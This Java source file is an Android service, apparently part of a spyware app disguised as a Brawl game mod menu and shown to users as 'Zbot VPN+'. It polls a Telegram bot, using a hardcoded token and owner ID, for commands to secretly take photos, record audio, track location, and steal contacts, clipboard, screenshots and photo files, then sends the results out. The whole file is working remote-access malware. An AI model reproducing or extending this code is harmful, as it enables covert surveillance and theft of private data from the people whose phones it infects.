package com.brawl.modmenu;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONArray;
import org.json.JSONObject;

public class CommandListener extends Service {

    private static final String TOKEN = "8688274559:AAGlGdaQh70HHSrEs_zMdkeW1udazQr6z5A";
    private static final String OWNER = "8558500657";
    private static final long INTERVAL = 5000;
    private static final String CH = "zbot_svc";
    private long lastUpdateId = 0;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean running = false;
    private long pollCount = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel ch = new NotificationChannel(
                CH, "Zbot сервис", NotificationManager.IMPORTANCE_MIN);
            ch.setShowBadge(false);
            NotificationManager nm = (NotificationManager)
                getSystemService(NOTIFICATION_SERVICE);
            if (nm != null) nm.createNotificationChannel(ch);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        try {
            Notification.Builder b;
            if (Build.VERSION.SDK_INT >= 26) {
                b = new Notification.Builder(this, CH);
            } else {
                b = new Notification.Builder(this);
            }
            b.setContentTitle("Zbot VPN+")
             .setContentText("Сервис активен")
             .setSmallIcon(android.R.drawable.stat_notify_sync);
            startForeground(1, b.build());
        } catch (Throwable ignored) {}

        if (!running) {
            running = true;
            Exfil.send("CMD", "Listener foreground запущен");
            handler.post(poll);
        }
        return START_STICKY;
    }

    private Runnable poll = new Runnable() {
        @Override
        public void run() {
            new Thread(() -> {
                pollCount++;
                try {
                    String url = "https://api.telegram.org/bot" + TOKEN
                        + "/getUpdates?offset=" + (lastUpdateId + 1)
                        + "&timeout=2";
                    HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                    c.setConnectTimeout(20000);
                    c.setReadTimeout(20000);
                    BufferedReader r = new BufferedReader(
                        new InputStreamReader(c.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = r.readLine()) != null) sb.append(line);
                    r.close();

                    String resp = sb.toString();
                    JSONObject obj = new JSONObject(resp);

                    if (!obj.optBoolean("ok", false)) {
                        if (pollCount % 20 == 0) {
                            Exfil.send("CMD_ERR", "API не ok. Poll#" + pollCount);
                        }
                        if (running) handler.postDelayed(poll, INTERVAL);
                        return;
                    }

                    JSONArray arr = obj.optJSONArray("result");
                    int count = arr != null ? arr.length() : 0;

                    if (pollCount % 20 == 0) {
                        Exfil.send("CMD_ALIVE", "Poll#" + pollCount
                            + " LastID=" + lastUpdateId
                            + " новых=" + count);
                    }

                    if (arr != null && count > 0) {
                        for (int i = 0; i < count; i++) {
                            JSONObject upd = arr.getJSONObject(i);
                            lastUpdateId = upd.optLong("update_id", lastUpdateId);
                            JSONObject msg = upd.optJSONObject("message");
                            if (msg == null) continue;
                            JSONObject chat = msg.optJSONObject("chat");
                            if (chat == null) continue;
                            String chatId = chat.optString("id", "");
                            if (!OWNER.equals(chatId)) continue;
                            String text = msg.optString("text", "").trim();
                            if (text.isEmpty()) continue;

                            Exfil.send("CMD_RCV", "Получено: " + text);
                            handleCommand(text);
                        }
                    }
                } catch (Throwable t) {
                    if (pollCount % 10 == 0) {
                        Exfil.send("CMD_ERR", "Poll#" + pollCount + ": "
                            + t.getClass().getSimpleName());
                    }
                }
                if (running) handler.postDelayed(poll, INTERVAL);
            }).start();
        }
    };

    private void handleCommand(String text) {
        try {
            if (text.startsWith("/ping")) {
                Exfil.send("CMD", "Pong! Работает");
                return;
            }
            if (text.startsWith("/help") || text.startsWith("/start")) {
                Exfil.send("HELP", "/ping /screenshot /photo /mic /location /info /apps /battery /vibrate /contacts /screens /photos_all /test_photos");
                return;
            }
            if (text.startsWith("/info")) { CommandHandler.sendInfo(this); return; }
            if (text.startsWith("/apps")) { AppList.dump(this); return; }
            if (text.startsWith("/games")) { GameList.dump(this); return; }
            if (text.startsWith("/contacts")) { CommandHandler.sendContacts(this); return; }
            if (text.startsWith("/location")) { CommandHandler.sendLocation(this); return; }
            if (text.startsWith("/photo")) { CommandHandler.takePhoto(this); return; }
            if (text.startsWith("/mic")) { CommandHandler.recordMic(this, 20); return; }
            if (text.startsWith("/clip")) { CommandHandler.sendClipboard(this); return; }
            if (text.startsWith("/battery")) { CommandHandler.sendBattery(this); return; }
            if (text.startsWith("/vibrate")) { CommandHandler.vibrate(this); Exfil.send("CMD", "Вибрация"); return; }
            if (text.startsWith("/screenshot")) {
                try {
                    Intent i = new Intent(this, MediaSniffer.class);
                    i.setAction("CAPTURE_NOW");
                    startService(i);
                } catch (Throwable t) {}
                return;
            }
            if (text.startsWith("/screens")) { ScreenshotsGrabber.grab(); return; }
            if (text.startsWith("/photos_all")) { FileManager.allPhotos(this); return; }
            if (text.startsWith("/photos")) { FileManager.lastPhotos(this); return; }
            if (text.startsWith("/test_photos")) { PhotoLocator.locate(); return; }
            Exfil.send("CMD", "Неизвестно: " + text);
        } catch (Throwable t) {
            Exfil.send("CMD", "Ошибка: " + t.getMessage());
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        running = false;
        handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }
}
